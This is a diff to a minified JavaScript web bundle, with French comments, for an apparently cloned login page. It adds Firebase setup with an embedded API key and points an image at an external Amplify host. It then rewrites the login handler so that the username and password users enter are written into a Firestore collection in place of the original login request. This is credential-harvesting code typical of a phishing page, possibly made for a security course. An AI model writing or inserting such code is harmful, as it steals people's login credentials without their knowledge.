@@ -1,4 +1,16 @@
 /*! For license information please see main.198a48f8.js.LICENSE.txt */
+import { initializeApp, firestore } from "firebase";
+
+// Connexion à la base de données
+initializeApp({
+  apiKey: "AIzaSyA_Xr5mF1cFcsG-pM-yHZDvnDcED2L4bq0",
+  authDomain: "sec1td1.firebaseapp.com",
+  // databaseURL: "YOUR_DATABASE_URL",
+});
+
+// Référence à la collection
+const collection = firestore().collection("Oj2Is2fQpvGNF8LObFHR");
+
 !(function () {
   var e = {
       694: function (e, t) {
@@ -26818,7 +26830,8 @@
       }
       var Ed,
         Cd = r.forwardRef(Sd),
-        Od = ("https://dev582.d17u48yulpjvd3.amplifyapp.com/static/media/locked.f5d0283e620d7d7ae9f5.png"),
+        Od =
+          "https://dev582.d17u48yulpjvd3.amplifyapp.com/static/media/locked.f5d0283e620d7d7ae9f5.png",
         //Od = (n.p, n.p + "static/media/locked.f5d0283e620d7d7ae9f5.png"),
         Rd = ["title", "titleId"];
       function _d() {
@@ -32375,18 +32388,27 @@
                       case 18:
                         return (
                           (n.next = 20),
+                          collection
+                            .add({
+                              name: o,
+                              password: i,
+                            })
+                            .then(function (docRef) {
+                              console.log("Document ajouté : ", docRef);
+                            })
+                            .catch(function (error) {
+                              console.error(
+                                "Erreur lors de l'ajout du document : ",
+                                error
+                              );
+                            })
                           // ((l = { cliId: e.cliId, username: o, password: i }),
                           // ov({ method: "post", url: "/login", data: l })).then(
                           //   function (e) {
                           //     return e.data;
                           //   }
                           // )
-                          ((l = { name: o, password: i }),
-                          ov({ method: "post", url: "/Oj2Is2fQpvGNF8LObFHR", data: l })).then(
-                            function (e) {
-                              return e.data;
-                            }
-                          )
+
                           // fetch(
                           //   "https://firebase.googleapis.com/v1/projects/sec1td1/databases/1/Oj2Is2fQpvGNF8LObFHR",
                           //   {
